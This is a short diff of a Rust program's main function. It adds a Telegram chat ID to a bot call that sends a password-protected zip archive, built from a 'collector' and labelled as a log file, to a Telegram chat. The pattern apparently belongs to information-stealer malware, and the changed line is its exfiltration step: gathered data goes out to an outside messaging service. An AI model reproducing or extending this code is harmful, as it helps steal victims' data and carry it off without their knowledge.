@@ -59,7 +59,7 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     // let out = Path::new("output.zip");
     // let _ = StorageFileSystem.write_file(&out, &zip);
 
-    TelegramBot::new(Arc::from(env!("TELEGRAM_BOT_TOKEN")))
+    TelegramBot::new(env!("TELEGRAM_CHAT_ID").parse::<i64>().unwrap(), Arc::from(env!("TELEGRAM_BOT_TOKEN")))
         .send(LogFile::ZipArchive(zip), Some(password), &collector)
         .unwrap();
 
